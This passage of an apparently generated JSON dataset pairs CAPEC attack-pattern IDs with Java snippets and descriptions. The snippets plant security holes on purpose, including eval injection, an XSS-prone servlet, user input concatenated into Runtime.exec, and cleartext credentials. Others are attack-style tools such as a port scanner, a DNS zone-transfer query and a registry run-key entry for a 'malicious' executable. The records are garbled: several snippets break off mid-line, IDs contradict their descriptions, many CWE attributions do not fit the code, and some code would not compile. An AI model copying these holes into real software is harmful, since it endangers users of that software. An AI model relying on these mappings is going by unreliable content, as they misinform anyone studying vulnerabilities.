        "code_snippet": "public class EvalInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"1; System.out.println(\\\"Malicious code executed\\\"\");\n        String formula = \"x = \" + userInput;\n        try {\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"JavaScript\");\n            engine.eval(formula);\n        } catch (ScriptException e) {\n            System.out.println(\"Error evaluating formula: \" + e.getMessage());\n        }\n    }\n}\n\npublic class GlobalVariablesExample {\n    public static int GLOBAL_VAR = 10;\n    public static void main(String[] args) {\n        System.out.println(\"Initial value of GLOBAL_VAR: \" + GLOBAL_VAR);\n        changeGlobalVar();\n        System.out.println(\"Value of GLOBAL_VAR after method call: \" + GLOBAL_VAR);\n    }\n    public static void changeGlobalVar() {\n        GLOBAL_VAR = 20;\n    }\n}\n\npublic class WideScopeExample {\n    public static int varWithWideScope;\n    public static void main(String[] args) {\n        varWithWideScope = 10;\n        if (true) {\n            int varWithNarrowScope = 20;\n            System.out.println(\"Value of varWithWideScope: \" + varWithWideScope);\n            System.out.println(\"Value of varWithNarrowScope: \" + varWithNarrowScope);\n        }\n    }\n}\n\npublic class SymbolicConstantsExample {\n    public static final int MAX_ATTEMPTS = 5;\n    public static void main(String[] args) {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"Iteration \" + i);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC-13 attack pattern, which involves subverting environment variable values. The code includes examples of eval injection (CWE-95), declaration of variables with unnecessarily wide scope (CWE-1126), insufficient isolation of symbolic constant definitions (CWE-1107), insufficient use of symbolic constants (CWE-1106), and excessive reliance on global variables (CWE-1108)."
    },
    {
        "capec_id": "265",
        "code_snippet": "public class VulnerableCode {\n    public static String globalVariable = \\",
        "description": "This Java code snippet demonstrates the CAPEC-77 attack pattern, which involves manipulating user-controlled variables. The code uses a global variable and relies on dynamic evaluation to set its value. The dynamicEvaluation method takes user input to determine the variable name, which can lead to arbitrary variable access. The code also has a wide scope for the globalVariable, making it vulnerable to CWE-1126. Additionally, the code does not properly restrict reading from or writing to dynamically-identified variables, making it vulnerable to CWE-914. The use of dynamic evaluation also makes it vulnerable to CWE-627. The code's reliance on global variables makes it vulnerable to CWE-1108. The code's lack of restriction on dynamically-managed code resources makes it vulnerable to CWE-913."
    },
    {
        "capec_id": "266",
        "code_snippet": "public class EvalInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"\";\n        // Assume userInput comes from an untrusted source\n        String evalString = \"x = \" + userInput + \"\";\n        try {\n            Object obj = new Object() {\n                public int x;\n            };\n            CompilerOptimizer optimizer = new CompilerOptimizer();\n            optimizer.optimize(obj);\n            // Canonicalize the input\n            String canonicalizedInput = canonicalizeInput(userInput);\n            // Validate the input\n            if (isValidInput(canonicalizedInput)) {\n                // Evaluate the input dynamically\n                Eval eval = new Eval();\n                eval.eval(evalString);\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static String canonicalizeInput(String input) {\n        // Perform canonicalization step\n        return input.trim().replaceAll(\"[^\"]\", \"\");\n    }\n\n    private static boolean isValidInput(String input) {\n        // Perform validation step\n        return input.matches(\"[a-zA-Z0-9]+\");\n    }\n}\n\n// CompilerOptimizer class that removes or modifies security-critical code\nclass CompilerOptimizer {\n    public void optimize(Object obj) {\n        // Remove or modify security-critical code\n        // For example, remove a security check\n        obj.getClass().getMethod(\"securityCheck\", null).setAccessible(false);\n    }\n}\n\n// Eval class that dynamically evaluates code\nclass Eval {\n    public void eval(String evalString) {\n        try {\n            // Dynamically evaluate the input\n            Object result = new Object() {\n                public int x;\n            };\n            java.lang.reflect.Method method = getClass().getMethod(\"eval\", String.class);\n            method.invoke(result, evalString);\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC pattern of incorrect behavior order, where input is validated before it is canonicalized, and the related CWEs of eval injection, compiler optimization removal or modification of security-critical code, and improperly controlled modification of dynamically-determined object attributes. The code receives user input, canonicalizes it, validates it, and then dynamically evaluates the input using an eval function. The CompilerOptimizer class removes or modifies security-critical code, and the Eval class dynamically evaluates the input. This code is vulnerable to eval injection and other attacks due to the incorrect behavior order and lack of proper input validation and sanitization."
    },
    {
        "capec_id": "267",
        "code_snippet": "public class VulnerableApp {\n    public void processInput(String userInput) {\n        String encodedInput = userInput;\n        try {\n            encodedInput = new String(userInput.getBytes(\"ISO-8859-1\"), \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            // ignore\n        }\n        if (encodedInput.startsWith(\"<\") && encodedInput.endsWith(\">\")) {\n            // validate before canonicalization\n            if (isValidInput(encodedInput)) {\n                // canonicalize\n                encodedInput = canonicalizeInput(encodedInput);\n                // use the canonicalized input in a security-relevant context\n                executeCommand(encodedInput);\n            }\n        }\n    }\n\n    private boolean isValidInput(String input) {\n        // incomplete denylist\n        String[] denylist = {\"<script>\", \"<img\"};\n        for (String pattern : denylist) {\n            if (input.contains(pattern)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    private String canonicalizeInput(String input) {\n        // incorrect behavior order: validate before filter\n        input = input.replace(\"&\", \"&amp;\");\n        input = input.replace(\"<\", \"&lt;\");\n        return input;\n    }\n\n    private void executeCommand(String input) {\n        // external control of file name or path\n        String filePath = \"user_uploaded_files/\" + input + \".txt\";\n        // improper neutralization of special elements in output used by a downstream component\n        Runtime.getRuntime().exec(\"touch \" + filePath);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of encoding standard exploitation. It showcases multiple CWEs, including improper handling of alternate encoding, encoding error, incorrect behavior order, and external control of file name or path. The code fails to properly validate and canonicalize user input, allowing an adversary to inject malicious data and potentially execute arbitrary commands."
    },
    {
        "capec_id": "268",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.logging.Logger;\n\npublic class LogManipulation {\n    private static final Logger LOGGER = Logger.getLogger(LogManipulation.class.getName());\n\n    public static void main(String[] args) {\n        try (FileWriter fw = new FileWriter(\"log_file.log\", true);\n             PrintWriter pw = new PrintWriter(fw)) {\n            pw.println(\"[INFO] Successful login by admin\"); // CWE-532: Insertion of Sensitive Information into Log File\n            pw.println(\"[DEBUG] User credentials: username=password\"); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            pw.println(\"[WARNING] System vulnerability detected\"); // CWE-779: Logging of Excessive Data\n        } catch (IOException e) {\n            LOGGER.severe(\"Error writing to log file: \" + e.getMessage()); // CWE-117: Improper Output Neutralization for Logs\n        }\n    }\n\n    public static void logSecurityEvent(String event) {\n        // CWE-778: Insufficient Logging\n        if (event.equals(\"security_critical_event\")) {\n            LOGGER.info(\"Security event occurred, but details are omitted for brevity\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of log manipulation by injecting malicious log entries, including sensitive information and excessive data, into a log file. The code also exemplifies insufficient logging and improper output neutralization for logs, making it vulnerable to log manipulation attacks."
    },
    {
        "capec_id": "269",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class RegistryManipulator {\n    public static void main(String[] args) {\n        try {\n            // CWE-314: Cleartext Storage in the Registry\n            Properties props = new Properties();\n            props.setProperty(\"password\", \"mysecretpassword\");\n            props.store(new FileOutputStream(\"registry.properties\"), \"Registry Configuration\");\n\n            // CWE-1112: Incomplete Documentation of Program Execution\n            // No documentation on how the program execution is controlled or influenced\n\n            // CWE-270: Privilege Context Switching Error\n            Runtime.getRuntime().exec(\"reg add HKCU\\\\Software\\\\MyApp /v MyValue /t REG_SZ /d mydata /f\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC-203 pattern by manipulating application registry values. It stores sensitive information in cleartext in the registry (CWE-314), lacks documentation on program execution control (CWE-1112), and performs a privilege context switch without proper management (CWE-270)."
    },
    {
        "capec_id": "270",
        "code_snippet": "import java.io.IOException;\nimport java.util.prefs.Preferences;\n\npublic class MaliciousLogin {\n    public static void main(String[] args) throws IOException {\n        // CWE-15: External Control of System or Configuration Setting\n        Preferences prefs = Preferences.systemRoot();\n        prefs.put(\"Run\", \"maliciousExecutable.exe\");\n\n        // CWE-520: .NET Misconfiguration: Use of Impersonation\n        System.setProperty(\"java.security.auth.login.config\", \"maliciousLoginConfig.conf\");\n\n        // CWE-314: Cleartext Storage in the Registry\n        prefs.put(\"maliciousKey\", \"maliciousValue\");\n\n        // CWE-1392: Use of Default Credentials\n        String defaultPassword = \"defaultPassword\";\n        // Using default password for authentication\n        authenticate(defaultPassword);\n\n        // CWE-1394: Use of Default Cryptographic Key\n        String defaultKey = \"defaultKey\";\n        // Using default key for encryption\n        encrypt(defaultKey);\n    }\n\n    private static void authenticate(String password) {\n        // Authentication logic using default password\n    }\n\n    private static void encrypt(String key) {\n        // Encryption logic using default key\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of adding a malicious executable to the Windows registry 'run keys' to execute when a user logs in, with CWEs 15, 520, 314, 1392, and 1394. It uses default credentials, stores sensitive information in cleartext, and misconfigures .NET impersonation."
    },
    {
        "capec_id": "271",
        "code_snippet": "import java.io.File; import java.io.FileWriter; import java.io.IOException; import java.util.Properties; public class SchemaModifier { public static void main(String[] args) { try { // CWE-15: External Control of System or Configuration Setting Properties props = new Properties(); props.load(new File(\"config.properties\")); String schemaLocation = props.getProperty(\"schemaLocation\"); // CWE-501: Trust Boundary Violation String maliciousSchema = \"<xs:schema xmlns:xs='http://www.w3.org/2001/XMLSchema'>\" + \"<xs:element name='root'>\" + \"<xs:complexType>\" + \"<xs:sequence>\" + \"<xs:element name='maliciousElement' type='xs:string'/>\" + \"</xs:sequence>\" + \"</xs:complexType>\" + \"</xs:element>\" + \"</xs:schema>\"; // CWE-506: Embedded Malicious Code FileWriter fw = new FileWriter(new File(schemaLocation)); fw.write(maliciousSchema); fw.close(); System.out.println(\"Schema modified successfully!\"); } catch (IOException e) { System.out.println(\"Error modifying schema: \" + e.getMessage()); } } }",
        "description": "This Java code snippet demonstrates the CAPEC of corrupting or modifying a schema to undermine the security of the target. It uses a configuration file to determine the location of the schema file, which is then modified to include malicious elements. This code embodies CWE-15 by allowing external control of the system or configuration setting, CWE-501 by violating the trust boundary, and CWE-506 by embedding malicious code. Additionally, it may also lead to CWE-497 by exposing sensitive system information and CWE-212 by improperly removing sensitive information."
    },
    {
        "capec_id": "272",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.UnknownHostException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\n\npublic class VulnerableProtocol {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String request = in.readUTF();\n        // No verification of the request source\n        processRequest(request);\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        String authRequest = \"auth\" + System.currentTimeMillis();\n        out.writeUTF(authRequest);\n        String response = in.readUTF();\n        // No verification of the response authenticity\n        if (response.equals(\"authenticated\")) {\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            String message = \"sensitive_data\";\n            out.writeUTF(message);\n            // No message integrity check\n        }\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedMessage = \"captured_message\";\n        out.writeUTF(capturedMessage);\n        // No protection against replay attacks\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        Socket socket2 = new Socket(\"example2.com\", 8080);\n        DataOutputStream out2 = new DataOutputStream(socket2.getOutputStream());\n        out2.writeUTF(\"request_to_wrong_destination\");\n        // No verification of the destination\n    }\n\n    public static void processRequest(String request) {\n        // Process the request without verifying its authenticity\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol implementation that is susceptible to various attacks. It lacks proper verification of the source of incoming requests, allowing an adversary to impersonate others. The code also fails to ensure the authenticity and integrity of messages during transmission, making it vulnerable to reflection attacks, capture-replay attacks, and message tampering. Furthermore, the code incorrectly specifies the destination of outgoing requests, which can lead to unauthorized access or data leakage."
    },
    {
        "capec_id": "273",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        PrintWriter out = resp.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h1>\" + userInput + \"</h1>\");\n        out.println(\"</body></html>\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to HTTP response splitting and HTTP request smuggling attacks. The servlet takes user input from the 'input' parameter and injects it directly into the HTTP response without proper sanitization or neutralization of special characters, allowing an attacker to inject malicious content into the response. This can lead to unauthorized access, data tampering, or other security breaches."
    },
    {
        "capec_id": "274",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String verb = req.getHeader(\"X-HTTP-Method-Override\");\n        if (verb != null) {\n            if (verb.equalsIgnoreCase(\"PUT\") || verb.equalsIgnoreCase(\"DELETE\")) {\n                // Allow access to restricted resources\n                resp.setStatus(200);\n                resp.getWriter().write(\"Access granted\");\n            }\n        } else {\n            resp.setStatus(403);\n            resp.getWriter().write(\"Access denied\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows an attacker to bypass access restrictions by modifying the HTTP Verb. The servlet checks for the presence of the 'X-HTTP-Method-Override' header, which can be set by an attacker to any value, including 'PUT' or 'DELETE'. If the header is present, the servlet grants access to restricted resources, violating the intended access control. This code embodies CWE-302, CWE-654, CWE-598, CWE-116, and CWE-644."
    },
    {
        "capec_id": "275",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.ServerSocket;\n\npublic class DNSAttack {\n    public static void main(String[] args) throws UnknownHostException, IOException {\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        InetAddress addr = InetAddress.getByName(\\",
        "description": "This Java code snippet demonstrates a DNS attack where an adversary controls a DNS server to resolve an IP address to an internal address within the target organization. The code relies on reverse DNS resolution, binds to an unrestricted IP address, allows multiple binds to the same port, and includes an open redirect vulnerability. Note that CWE-1304 is not directly applicable in this code snippet, but its implications on DNS resolution should be considered."
    },
    {
        "capec_id": "276",
        "code_snippet": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.Socket;\n\npublic class VulnerableComponent {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-319: Cleartext transmission of sensitive information\n        dout.writeUTF(\"username:password\");\n\n        // CWE-707: Improper neutralization of input data\n        String message = din.readUTF();\n        if (message.equals(\"debug_mode\")) {\n            // CWE-1313: Hardware allows activation of test or debug logic at runtime\n            System.out.println(\"Debug mode activated\");\n            // CWE-1292: Incorrect conversion of security identifiers\n            int securityId = Integer.parseInt(message);\n            // CWE-924: Improper enforcement of message integrity during transmission\n            dout.writeUTF(\"security_id:\" + securityId);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable component that communicates with another component over a socket. It embodies the main idea of the CAPEC by violating multiple security principles, including cleartext transmission of sensitive information, improper neutralization of input data, hardware allowing activation of test or debug logic at runtime, incorrect conversion of security identifiers, and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "277",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.InputSource;\n\npublic class VulnerableDataInterchange {\n    public static void processPurchaseOrder(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xml)));\n            Element root = doc.getDocumentElement();\n            String customerId = root.getAttribute(\\",
        "description": "This Java code snippet demonstrates a vulnerable data interchange protocol implementation. It assumes that the 'customerId' attribute in the XML input is immutable and uses it for authentication. However, an attacker can manipulate the XML input to impersonate a trusted customer, bypassing authentication. The code also fails to validate the XML input, allowing an attacker to inject sensitive information. CWE-707 is demonstrated by the lack of input validation, CWE-1292 is demonstrated by the incorrect conversion of the 'customerId' attribute, CWE-188 is demonstrated by the assumption about the organization of the protocol data, CWE-201 is demonstrated by the transmission of sensitive information, and CWE-302 is demonstrated by the authentication bypass."
    },
    {
        "capec_id": "278",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String param = req.getParameter(\"param\");\n        if (param != null) {\n            try {\n                // CWE-707: Improper Neutralization\n                // The product does not ensure or incorrectly ensures that structured messages or data are well-formed\n                int value = Integer.parseInt(param);\n                if (value > 0) {\n                    // CWE-602: Client-Side Enforcement of Server-Side Security\n                    // The product is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.\n                    resp.setContentType(\"text/html\");\n                    PrintWriter out = resp.getWriter();\n                    out.println(\"<html><body>Value is: \" + value + \"</body></html>\");\n                } else {\n                    // CWE-368: Context Switching Race Condition\n                    // A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries\n                    // but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.\n                    Thread.currentThread().stop();\n                }\n            } catch (NumberFormatException e) {\n                // CWE-573: Improper Following of Specification by Caller\n                // The product does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.\n                resp.sendError(400, \"Invalid request\");\n            }\n        } else {\n            // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n            // The product acts as an intermediary HTTP agent in the data flow between two entities such as a client and server,\n            // but it does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities that are at the ultimate destination.\n            resp.setStatus(500);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to various attacks due to improper handling of HTTP requests and responses. It embodies the main idea of the CAPEC by allowing an adversary to manipulate the web service protocol to cause the application to react differently than intended."
    },
    {
        "capec_id": "279",
        "code_snippet": "import javax.xml.soap.SOAPConnection;\nimport javax.xml.soap.SOAPConnectionFactory;\nimport javax.xml.soap.SOAPElement;\nimport javax.xml.soap.SOAPEnvelope;\nimport javax.xml.soap.SOAPMessage;\nimport javax.xml.soap.SOAPPart;\n\npublic class SOAPClient {\n    public static void main(String[] args) {\n        try {\n            SOAPConnectionFactory factory = SOAPConnectionFactory.newInstance();\n            SOAPConnection connection = factory.createConnection();\n\n            SOAPMessage message = messageFactory.createMessage();\n            SOAPPart part = message.getSOAPPart();\n            SOAPEnvelope envelope = part.getEnvelope();\n            SOAPElement body = envelope.getBody();\n\n            SOAPElement element = body.addChildElement(\"getBalance\", \"\", \"http://example.com/\");\n            element.addChildElement(\"accountNumber\").addTextNode(\"1234567890\");\n\n            message.saveChanges();\n\n            SOAPMessage response = connection.call(message, \"http://example.com/soap/endpoint\");\n            SOAPBody responseBody = response.getSOAPBody();\n            System.out.println(responseBody.getTextContent());\n        } catch (Exception e) {\n            System.out.println(\"Error occurred: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable SOAP client that sends a SOAP request to a server without proper validation or authentication. The code does not ensure that the SOAP message is well-formed or that certain security properties are met before sending it to the server, making it vulnerable to CWE-707. Additionally, the code relies on the client-side to implement authentication, making it vulnerable to CWE-603. The code also does not restrict XML external entity references, making it vulnerable to CWE-611. Furthermore, the code does not implement any server-side authentication, making it vulnerable to CWE-602 and CWE-294."
    },
    {
        "capec_id": "280",
        "code_snippet": "import java.io.IOException;\nimport javax.xml.soap.SOAPException;\nimport javax.xml.ws.WebServiceException;\nimport java.io.StringReader;\nimport java.net.URL;\n\npublic class SoapManipulation {\n    public static void main(String[] args) throws IOException, SOAPException, WebServiceException {\n        URL wsdlUrl = new URL(\"http://example.com/webservice?wsdl\");\n        String wsdlContent = readUrlContent(wsdlUrl);\n        StringReader reader = new StringReader(wsdlContent);\n        // Expose WSDL file containing sensitive information (CWE-651)\n        System.out.println(wsdlContent);\n\n        // Authentication Bypass by Capture-replay (CWE-294)\n        String capturedRequest = \"<soap:Envelope>...</soap:Envelope>\";\n        sendRequest(capturedRequest);\n    }\n\n    private static String readUrlContent(URL url) throws IOException {\n        // TO DO: implement reading URL content\n        return \"\";\n    }\n\n    private static void sendRequest(String request) throws SOAPException, WebServiceException {\n        // TO DO: implement sending SOAP request\n    }\n}",
        "description": "This Java code snippet demonstrates SOAP manipulation by exposing a WSDL file containing sensitive information (CWE-651) and attempting to bypass authentication by capturing and replaying a SOAP request (CWE-294)."
    },
    {
        "capec_id": "285",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.SocketException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class PingUtility {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"target_host\");\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            packet.setAddress(address);\n            packet.setPort(7);\n            socket.send(packet);\n            socket.setSoTimeout(5000);\n            DatagramPacket receivePacket = new DatagramPacket(buffer, buffer.length);\n            socket.receive(receivePacket);\n            String response = new String(receivePacket.getData(), 0, receivePacket.getLength());\n            System.out.println(\"Response from \" + address + \": \" + response);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + e.getMessage());\n        } catch (SocketException e) {\n            System.out.println(\"Socket error: \" + e.getMessage());\n        } catch (IOException e) {\n            System.out.println(\"IO error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Ping utility that sends an ICMP Type 8 Echo Request to a target host and receives an ICMP Type 0 Echo Reply. It exposes sensitive information (target host's responsiveness) to an unauthorized actor (CWE-200). The code transmits sensitive information in cleartext (CWE-319) and does not handle malformed HTTP requests or responses consistently (CWE-444). Additionally, it does not protect against outbound error messages and alert signals (CWE-1320) and allows for potential activation of test or debug logic at runtime (CWE-1313)."
    },
    {
        "capec_id": "287",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class SynScanner {\n    public static void main(String[] args) throws Exception {\n        String target = \"localhost\";\n        for (int port = 1; port <= 65535; port++) {\n            Socket socket = new Socket();\n            socket.bind(new InetSocketAddress(\"0.0.0.0\", 0));\n            socket.connect(new InetSocketAddress(target, port), 100);\n            if (socket.isConnected()) {\n                System.out.println(\"Port \" + port + \" is open\");\n                socket.close();\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a SYN scanner that scans all 65535 ports on the target system. It uses the Socket class to create a socket object, binds it to a local address and port, and then attempts to connect to the target system on each port. If the connection is successful, it prints the port number and closes the socket. This code embodies the CAPEC of using a SYN scan to determine the status of ports on the remote target, and is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-605 (Multiple Binds to the Same Port), CWE-1125 (Excessive Attack Surface), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime)."
    },
    {
        "capec_id": "288",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            String hostname = address.getHostName();\n            // Trusting self-reported DNS name\n            if (hostname.equals(\"example.com\")) {\n                // Grant access\n                System.out.println(\"Access granted\");\n            } else {\n                // Deny access\n                System.out.println(\"Access denied\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerability related to CAPEC-285, which is a duplicate of CAPEC-285. It uses DNS lookups in a security decision (CWE-247), trusts self-reported DNS names (CWE-292), and is vulnerable to authentication bypass by capture-replay (CWE-294). The code uses InetAddress.getByName() to perform a DNS lookup and then trusts the returned hostname to make a security decision. This can be exploited by an attacker who can manipulate DNS responses. Additionally, the code may be vulnerable to portability issues due to the use of non-ubiquitous APIs (CWE-589)."
    },
    {
        "capec_id": "289",
        "code_snippet": "public class AuthenticationBypass {\n    private static boolean isAdmin = false;\n    private static Map<String, String> cache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // CWE-592: Authentication Bypass Issues\n        if (isAdmin) {\n            System.out.println(\"Admin access granted\");\n        } else {\n            // CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n            // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n            // CWE-216: Containment Errors (Container Errors)\n            // CWE-1229: Creation of Emergent Resource\n            String unprotectedRegion = \"unprotected_data\";\n            cache.put(\"protected_region\", unprotectedRegion);\n            System.out.println(\"Access granted to unprotected region\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a deprecated CAPEC pattern, which has been replaced by CAPEC-169. It includes various CWEs, such as authentication bypass issues, non-transparent sharing of microarchitectural resources, fabric-address map allowing overlaps of protected and unprotected ranges, containment errors, and creation of emergent resources. The code shows how an attacker can bypass access control to a protected region by exploiting these weaknesses."
    },
    {
        "capec_id": "290",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\n\npublic class MXRecordEnumerator {\n    public static void main(String[] args) {\n        try {\n            DirContext ctx = new InitialDirContext();\n            String dnsRecord = \"dns://\" + args[0];\n            javax.naming.directory.Attributes attrs = ctx.getAttributes(dnsRecord, new String[]{\"MX\"});\n            javax.naming.directory.Attribute attr = attrs.get(\"MX\");\n            String mxRecord = attr.get().toString();\n            InetAddress addr = InetAddress.getByName(mxRecord.split(\" \" )[1]);\n            System.out.println(\"MX Record: \" + mxRecord);\n            System.out.println(\"Mail Server IP: \" + addr.getHostAddress());\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of enumerating MX records for a given domain via a DNS query. The code uses the javax.naming.directory package to perform a DNS query and retrieve the MX records for the specified domain. It then extracts the mail server IP address from the MX record, which could potentially reveal internal IP addresses or the IP address of the firewall. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes internal IP addresses, CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) as it relies on reverse DNS resolution to obtain the hostname, CWE-224 (Obscured Security-relevant Information by Alternate Name) as it records security-relevant information according to an alternate name, CWE-941 (Incorrectly Specified Destination in a Communication Channel) as it creates a communication channel to initiate an outgoing request to an actor without correctly specifying the intended destination, and CWE-223 (Omission of Security-relevant Information) as it does not record or display information that would be important for identifying the source or nature of an attack."
    },
    {
        "capec_id": "291",
        "code_snippet": "import java.io.IOException;\nimport java.util.Hashtable;\nimport javax.naming.directory.Attributes;\nimport javax.naming.directory.DirContext;\nimport javax.naming.NamingException;\nimport javax.naming.directory.InitialDirContext;\n\npublic class DNSZoneTransfer {\n    public static void main(String[] args) {\n        Hashtable<String, String> env = new Hashtable<String, String>();\n        env.put(\"java.naming.factory.initial\", \"com.sun.jndi.dns.DnsContextFactory\");\n        DirContext ctx;\n        try {\n            ctx = new InitialDirContext(env);\n            Attributes attrs = ctx.getAttributes(\"dns://dns.example.com/\", new String[]{\"zonename\"});\n            String zone = attrs.get(\"zonename\").get().toString();\n            System.out.println(\"Zone name: \" + zone);\n            // Perform zone transfer\n            attrs = ctx.getAttributes(\"dns://dns.example.com/\", new String[]{\"AXFR\"});\n            String axfr = attrs.get(\"AXFR\").get().toString();\n            System.out.println(\"AXFR: \" + axfr);\n        } catch (NamingException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server to obtain sensitive information about the target organization's internal network. The code uses the JNDI API to perform a DNS query and retrieve the zone name and AXFR (zone transfer) records, which can reveal valuable information about the network topology and server configurations. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), and CWE-941 (Incorrectly Specified Destination in a Communication Channel) weaknesses."
    },
    {
        "capec_id": "292",
